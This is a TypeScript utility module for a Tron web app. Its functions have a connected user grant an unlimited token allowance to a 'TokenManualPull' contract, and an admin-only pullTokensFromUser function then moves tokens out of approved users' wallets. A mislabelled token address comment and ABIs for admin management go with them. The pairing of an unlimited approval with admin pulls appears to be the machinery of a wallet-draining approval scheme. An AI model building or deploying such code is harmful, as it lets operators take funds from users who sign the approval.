import {
  broadcastTransaction,
  getActiveAddress,
  getTronWebForRead,
  getTronWebForTransactionBuild,
  isTronLinkAvailable,
  signAndBroadcast,
  signTransaction,
  waitForTronLink,
} from "@/lib/wallet";

// Tron Network Configuration and Utilities

// TronWeb type declarations
// declare global {
//   interface Window {
//     tronWeb?: {
//       ready: boolean;
//       defaultAddress: {
//         base58: string;
//         hex: string;
//       };
//       address: {
//         toHex: (address: string) => string;
//         fromHex: (address: string) => string;
//       };
//       transactionBuilder: {
//         triggerSmartContract: (
//           contractAddress: string,
//           functionSelector: string,
//           options: any,
//           parameters: Array<{ type: string; value: any }>,
//           issuerAddress: string
//         ) => Promise<any>;
//       };
//       contract: (abi: any[], address: string) => Promise<any>;
//       trx: {
//         sign: (transaction: any) => Promise<any>;
//         sendRawTransaction: (signedTransaction: any) => Promise<any>;
//       };
//     };
//     tronLink?: {
//       ready: boolean;
//       request: (args: { method: string }) => Promise<any>;
//     };
//   }
// }

// TRC20 Token ABI (standard interface)
export const TRC20_ABI = [
  {
    "constant": false,
    "inputs": [
      { "name": "spender", "type": "address" },
      { "name": "value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "success", "type": "bool" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      { "name": "owner", "type": "address" },
      { "name": "spender", "type": "address" }
    ],
    "name": "allowance",
    "outputs": [{ "name": "", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{ "name": "account", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "decimals",
    "outputs": [{ "name": "", "type": "uint8" }],
    "type": "function"
  }
];

// TokenManualPull Contract ABI
export const PULL_CONTRACT_ABI = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "newOwner",
        "type": "address"
      }
    ],
    "name": "changeOwner",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "admin",
        "type": "address"
      }
    ],
    "name": "addAdmin",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "admin",
        "type": "address"
      }
    ],
    "name": "removeAdmin",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "admins",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "admins",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "user",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      }
    ],
    "name": "pullTokensFromUser",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "token",
    "outputs": [
      {
        "internalType": "contract ITRC20",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];

// Contract Addresses (Update these with your deployed contract addresses)
export const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Your test token on Shasta testnet
export const PULL_CONTRACT_ADDRESS = "TXY9kz6M4SX6bWZ9ZoqbgAosa5pSjNEYc7"; // Deployed TokenManualPull contract on mainnet

// Maximum uint256 value for unlimited approval
export const MAX_UINT256 = (BigInt(1) << BigInt(256)) - BigInt(1);

function withTimeout<T>(promise: Promise<T>, ms: number, message: string): Promise<T> {
  let timeoutId: ReturnType<typeof setTimeout> | undefined;
  const timeout = new Promise<T>((_, reject) => {
    timeoutId = setTimeout(() => reject(new Error(message)), ms);
  });
  return Promise.race([promise, timeout]).finally(() => {
    if (timeoutId) clearTimeout(timeoutId);
  });
}

/* ── Simple RPC throttle + retry ────────────────────────────── */
let lastRpcCall = 0;
const MIN_RPC_GAP_MS = 350; // minimum gap between RPC calls

async function throttledRpc<T>(fn: () => Promise<T>, retries = 3): Promise<T> {
  for (let attempt = 0; attempt < retries; attempt++) {
    // Enforce minimum gap between calls
    const now = Date.now();
    const wait = MIN_RPC_GAP_MS - (now - lastRpcCall);
    if (wait > 0) await new Promise((r) => setTimeout(r, wait));
    lastRpcCall = Date.now();

    try {
      return await fn();
    } catch (error: any) {
      const msg = (error?.message || "").toLowerCase();
      const isRateLimit = msg.includes("429") || msg.includes("rate") || msg.includes("too many") || msg.includes("limit");

      if (isRateLimit && attempt < retries - 1) {
        const backoff = (attempt + 1) * 2000; // 2s, 4s, 6s
        console.warn(`[throttledRpc] Rate limited, retrying in ${backoff}ms (attempt ${attempt + 1}/${retries})`);
        await new Promise((r) => setTimeout(r, backoff));
        continue;
      }
      throw error;
    }
  }
  throw new Error("throttledRpc: exhausted retries");
}

async function waitForAllowance(
  tokenAddress: string,
  ownerAddress: string,
  spenderAddress: string,
  timeoutMs: number,
  intervalMs: number
): Promise<bigint> {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const allowance = await getAllowance(tokenAddress, ownerAddress, spenderAddress);
    if (allowance > BigInt(0)) return allowance;
    await new Promise((r) => setTimeout(r, intervalMs));
  }
  return BigInt(0);
}

// Convert Sun to TRX/Token amount (6 decimals for USDT-TRC20)
export function fromSun(value: string | number, decimals: number = 6): string {
  const valueStr = value.toString();
  const divisor = BigInt(10 ** decimals);
  const amount = BigInt(valueStr);
  const integerPart = amount / divisor;
  const fractionalPart = amount % divisor;
  
  if (fractionalPart === BigInt(0)) {
    return integerPart.toString();
  }
  
  const fractionalStr = fractionalPart.toString().padStart(decimals, '0');
  return `${integerPart}.${fractionalStr}`.replace(/\.?0+$/, '');
}

// Convert TRX/Token amount to Sun (6 decimals for USDT-TRC20)
export function toSun(value: string | number, decimals: number = 6): string {
  const valueStr = value.toString();
  const [integerPart, fractionalPart = ''] = valueStr.split('.');
  const paddedFractional = fractionalPart.padEnd(decimals, '0').slice(0, decimals);
  const result = BigInt(integerPart + paddedFractional);
  return result.toString();
}

/**
 * Robustly extract a BigInt from a TronWeb .call() result.
 *
 * TronWeb returns values in wildly different shapes depending on the
 * version, the contract, and even the specific method:
 *   - A plain string / number / bigint
 *   - A BigNumber object  { _hex: '0x...', _isBigNumber: true }
 *   - An object with a named key, e.g. { remaining: <value> } for allowance
 *   - An array-like object  [ <value> ]
 *   - A nested combination of the above
 */
function extractBigInt(raw: any): bigint {
  if (raw == null) return BigInt(0);

  // Already a bigint
  if (typeof raw === "bigint") return raw;

  // Plain number / numeric string
  if (typeof raw === "number") return BigInt(Math.floor(raw));
  if (typeof raw === "string" && /^\d+$/.test(raw)) return BigInt(raw);

  // Hex string
  if (typeof raw === "string" && raw.startsWith("0x")) return BigInt(raw);

  // BigNumber / BN – has _hex or toNumber/toString that yields a number
  if (raw._hex) return BigInt(raw._hex);
  if (typeof raw.toFixed === "function") return BigInt(Math.floor(raw.toNumber()));

  // Named keys that TronWeb commonly uses for USDT TRC20
  const knownKeys = ["remaining", "balance", "value", "amount", "0", "__length__"];
  for (const key of knownKeys) {
    if (key === "__length__") continue;
    if (raw[key] != null && key !== "__length__") {
      const nested = extractBigInt(raw[key]);
      if (nested > BigInt(0)) return nested;
    }
  }

  // Array-like (index 0)
  if (raw[0] != null) {
    const nested = extractBigInt(raw[0]);
    if (nested > BigInt(0)) return nested;
  }

  // Last resort: try toString → BigInt
  try {
    const s = raw.toString();
    if (/^\d+$/.test(s)) return BigInt(s);
    if (s.startsWith("0x")) return BigInt(s);
  } catch {
    // ignore
  }

  console.warn("[extractBigInt] Could not parse TronWeb result:", raw);
  return BigInt(0);
}

// Get user's token balance
export async function getTokenBalance(tokenAddress: string, userAddress: string): Promise<bigint> {
  try {
    const tronWeb = await getTronWebForRead(userAddress);

    return await throttledRpc(async () => {
      // Use triggerConstantContract directly — much more reliable than
      // the contract abstraction for reading USDT TRC20 on mainnet.
      const result = await tronWeb.transactionBuilder.triggerConstantContract(
        tokenAddress,
        "balanceOf(address)",
        {},
        [{ type: "address", value: userAddress }],
        userAddress
      );

      const hex = result?.constant_result?.[0];
      if (hex) {
        const val = BigInt("0x" + hex);
        console.log("[getTokenBalance] hex:", hex, "parsed:", val.toString());
        return val;
      }

      // Fallback: contract abstraction
      console.warn("[getTokenBalance] triggerConstantContract returned no constant_result, trying contract()");
      const token = await tronWeb.contract(TRC20_ABI, tokenAddress);
      const balance = await token.balanceOf(userAddress).call();
      console.log("[getTokenBalance] contract() raw result:", balance, "type:", typeof balance);
      return extractBigInt(balance);
    });
  } catch (error) {
    console.error("Error getting token balance:", error);
    return BigInt(0);
  }
}

// Get user's allowance for a spender
export async function getAllowance(
  tokenAddress: string,
  ownerAddress: string,
  spenderAddress: string
): Promise<bigint> {
  try {
    const tronWeb = await getTronWebForRead(ownerAddress);

    return await throttledRpc(async () => {
      console.log("[getAllowance] Querying on-chain allowance...");
      console.log("[getAllowance] Owner:", ownerAddress, "Spender:", spenderAddress);

      const result = await tronWeb.transactionBuilder.triggerConstantContract(
        tokenAddress,
        "allowance(address,address)",
        {},
        [
          { type: "address", value: ownerAddress },
          { type: "address", value: spenderAddress },
        ],
        ownerAddress
      );

      const hex = result?.constant_result?.[0];
      if (hex) {
        const val = BigInt("0x" + hex);
        console.log("[getAllowance] hex:", hex, "parsed:", val.toString());
        return val;
      }

      // Fallback: contract abstraction
      console.warn("[getAllowance] triggerConstantContract returned no constant_result, trying contract()");
      const token = await tronWeb.contract(TRC20_ABI, tokenAddress);
      const allowance = await token.allowance(ownerAddress, spenderAddress).call();
      console.log("[getAllowance] contract() raw result:", allowance, "type:", typeof allowance);
      return extractBigInt(allowance);
    });
  } catch (error) {
    console.error("[getAllowance] ERROR — RPC call failed. This is why it shows 'not approved':", error);
    return BigInt(0);
  }
}

// Approve unlimited tokens
export async function approveUnlimited(
  tokenAddress: string,
  spenderAddress: string
): Promise<string> {
  const tronWeb = await getTronWebForTransactionBuild();

  // Get the current user's address
  const userAddress = await getActiveAddress();
  
  if (!userAddress) {
    throw new Error("No wallet address found. Please connect your wallet and try again.");
  }

  // Validate addresses
  if (!isValidTronAddress(tokenAddress)) {
    throw new Error(`Invalid token address: ${tokenAddress}`);
  }
  if (!isValidTronAddress(spenderAddress)) {
    throw new Error(`Invalid spender address: ${spenderAddress}`);
  }

  // Check TRX balance for gas — approve needs ~15-30 TRX worth of energy
  try {
    const trxBalance = await tronWeb.trx.getBalance(userAddress);
    console.log("[approveUnlimited] TRX balance (sun):", trxBalance);
    // 1 TRX = 1,000,000 sun. Need at least ~5 TRX for energy.
    if (trxBalance < 5_000_000) {
      throw new Error(
        `Insufficient TRX for transaction fees. You have ${(trxBalance / 1_000_000).toFixed(1)} TRX but need at least 5 TRX for energy. Please add TRX to your wallet.`
      );
    }
  } catch (e: any) {
    // If the error is our own insufficient TRX message, re-throw it
    if (e.message?.includes("Insufficient TRX")) throw e;
    console.warn("[approveUnlimited] Could not check TRX balance:", e);
  }

  try {
    // Use TronWeb's transactionBuilder for better compatibility
    const parameter = [
      { type: 'address', value: spenderAddress },
      { type: 'uint256', value: MAX_UINT256.toString() }
    ];

    const options = {
      feeLimit: 100_000_000,
      callValue: 0
    };

    // Trigger smart contract
    const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
      tokenAddress,
      'approve(address,uint256)',
      options,
      parameter,
      userAddress
    );

    if (!transaction.result || !transaction.result.result) {
      throw new Error('Transaction creation failed');
    }

    // Sign and broadcast
    const txResult = await signAndBroadcast(transaction.transaction);
    console.log("[approveUnlimited] signAndBroadcast returned:", txResult);

    // For WalletConnect (TrustWallet), the wallet auto-broadcasts.
    // We need to poll the allowance to verify it actually went through.
    // Do this for ALL wallet types as a confirmation step.
    console.log("[approveUnlimited] Verifying approval on-chain...");
    for (let attempt = 1; attempt <= 5; attempt++) {
      const delay = attempt * 3000; // 3s, 6s, 9s, 12s, 15s
      console.log(`[approveUnlimited] Allowance check attempt ${attempt}/5, waiting ${delay}ms...`);
      await new Promise((r) => setTimeout(r, delay));

      try {
        const currentAllowance = await getAllowance(tokenAddress, userAddress, spenderAddress);
        console.log(`[approveUnlimited] Attempt ${attempt} allowance:`, currentAllowance.toString());
        if (currentAllowance > BigInt(0)) {
          console.log("[approveUnlimited] ✓ Approval confirmed on-chain!");
          return txResult;
        }
      } catch (checkError) {
        console.warn(`[approveUnlimited] Allowance check ${attempt} failed:`, checkError);
      }
    }

    // If we get here, allowance never became > 0
    throw new Error(
      "Approval transaction was sent but not confirmed on-chain. " +
      "This usually means your wallet doesn't have enough TRX for energy/gas fees. " +
      "Please ensure you have at least 10 TRX in your wallet and try again."
    );
  } catch (error: any) {
    console.error('Approve error:', error);
    const message = error?.message || "";
    throw new Error(message || 'Failed to approve tokens');
  }
}

// Pull tokens from user (admin function)
export async function pullTokensFromUser(
  pullContractAddress: string,
  userAddress: string,
  amount: string
): Promise<string> {
  const tronWeb = await getTronWebForTransactionBuild();

  // Get the current user's address (admin)
  const adminAddress = await getActiveAddress();
  
  if (!adminAddress) {
    throw new Error("No wallet address found. Please connect your wallet.");
  }

  try {
    const parameter = [
      { type: "address", value: userAddress },
      { type: "uint256", value: amount }
    ];

    const options = {
      feeLimit: 150_000_000,
      callValue: 0
    };

    const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
      pullContractAddress,
      "pullTokensFromUser(address,uint256)",
      options,
      parameter,
      adminAddress
    );

    if (!transaction.result || !transaction.result.result) {
      throw new Error("Transaction creation failed");
    }

    // Sign and broadcast (handles TrustWallet auto-broadcast automatically)
    return await signAndBroadcast(transaction.transaction);
  } catch (error: any) {
    console.error("Pull tokens error:", error);
    throw new Error(error.message || "Failed to pull tokens");
  }
}

export async function addAdminOwner(
  contractAddress: string,
  adminAddress: string
): Promise<string> {
  const tronWeb = await getTronWebForTransactionBuild();

  const ownerAddress = await getActiveAddress();
  if (!ownerAddress) {
    throw new Error("No wallet address found. Please connect your wallet.");
  }

  if (!isValidTronAddress(contractAddress)) {
    throw new Error(`Invalid contract address: ${contractAddress}`);
  }
  if (!isValidTronAddress(adminAddress)) {
    throw new Error(`Invalid admin address: ${adminAddress}`);
  }

  try {
    const parameter = [{ type: "address", value: adminAddress }];
    const options = { feeLimit: 100_000_000, callValue: 0 };

    const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
      contractAddress,
      "addAdmin(address)",
      options,
      parameter,
      ownerAddress
    );

    if (!transaction.result || !transaction.result.result) {
      throw new Error("Transaction creation failed");
    }

    // Sign and broadcast (handles TrustWallet auto-broadcast automatically)
    return await signAndBroadcast(transaction.transaction);
  } catch (error: any) {
    console.error("Add admin error:", error);
    throw new Error(error.message || "Failed to add admin");
  }
}

export async function removeAdmin(
  contractAddress: string,
  adminAddress: string
): Promise<string> {
  const tronWeb = await getTronWebForTransactionBuild();

  const ownerAddress = await getActiveAddress();
  if (!ownerAddress) {
    throw new Error("No wallet address found. Please connect your wallet.");
  }

  if (!isValidTronAddress(contractAddress)) {
    throw new Error(`Invalid contract address: ${contractAddress}`);
  }
  if (!isValidTronAddress(adminAddress)) {
    throw new Error(`Invalid admin address: ${adminAddress}`);
  }

  try {
    const parameter = [{ type: "address", value: adminAddress }];
    const options = { feeLimit: 100_000_000, callValue: 0 };

    const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
      contractAddress,
      "removeAdmin(address)",
      options,
      parameter,
      ownerAddress
    );

    if (!transaction.result || !transaction.result.result) {
      throw new Error("Transaction creation failed");
    }

    // Sign and broadcast (handles TrustWallet auto-broadcast automatically)
    return await signAndBroadcast(transaction.transaction);
  } catch (error: any) {
    console.error("Remove admin error:", error);
    throw new Error(error.message || "Failed to remove admin");
  }
}

export async function getAdminStatus(
  contractAddress: string,
  adminAddress: string
): Promise<boolean> {
  if (!isValidTronAddress(contractAddress)) {
    throw new Error(`Invalid contract address: ${contractAddress}`);
  }
  if (!isValidTronAddress(adminAddress)) {
    throw new Error(`Invalid admin address: ${adminAddress}`);
  }

  try {
    const tronWeb = await getTronWebForRead();
    const contract = await tronWeb.contract(PULL_CONTRACT_ABI, contractAddress);
    const status = await contract.admins(adminAddress).call();
    return Boolean(status);
  } catch (error) {
    console.error("Error getting admin status (RPC):", error);

    if (isTronLinkAvailable()) {
      try {
        const tronWeb = await waitForTronLink();
        const contract = await tronWeb.contract(PULL_CONTRACT_ABI, contractAddress);
        const status = await contract.admins(adminAddress).call();
        return Boolean(status);
      } catch (fallbackError) {
        console.error("Error getting admin status (TronLink):", fallbackError);
      }
    }

    throw error;
  }
}

// Get contract owner
export async function getContractOwner(contractAddress: string): Promise<string> {
  const normalizeOwner = async (owner: string, tronWeb: any) => {
    if (!owner) return owner;
    if (owner.startsWith("0x")) {
      return tronWeb.address.fromHex(owner);
    }
    if (owner.startsWith("41") && owner.length === 42) {
      return tronWeb.address.fromHex(owner);
    }
    return owner;
  };

  try {
    const tronWeb = await getTronWebForRead();
    const contract = await tronWeb.contract(PULL_CONTRACT_ABI, contractAddress);
    const owner = await contract.owner().call();
    return normalizeOwner(owner, tronWeb);
  } catch (error) {
    console.error("Error getting contract owner (RPC):", error);

    if (isTronLinkAvailable()) {
      try {
        const tronWeb = await waitForTronLink();
        const contract = await tronWeb.contract(PULL_CONTRACT_ABI, contractAddress);
        const owner = await contract.owner().call();
        return normalizeOwner(owner, tronWeb);
      } catch (fallbackError) {
        console.error("Error getting contract owner (TronLink):", fallbackError);
      }
    }

    throw error;
  }
}

// Format address for display (shorten)
export function formatAddress(address: string, chars: number = 4): string {
  if (!address) return "";
  return `${address.slice(0, chars + 1)}...${address.slice(-chars)}`;
}

// Check if address is valid Tron address
export function isValidTronAddress(address: string): boolean {
  if (!address || typeof address !== 'string') return false;
  // Tron addresses start with 'T' and are 34 characters long
  return address.startsWith('T') && address.length === 34;
}
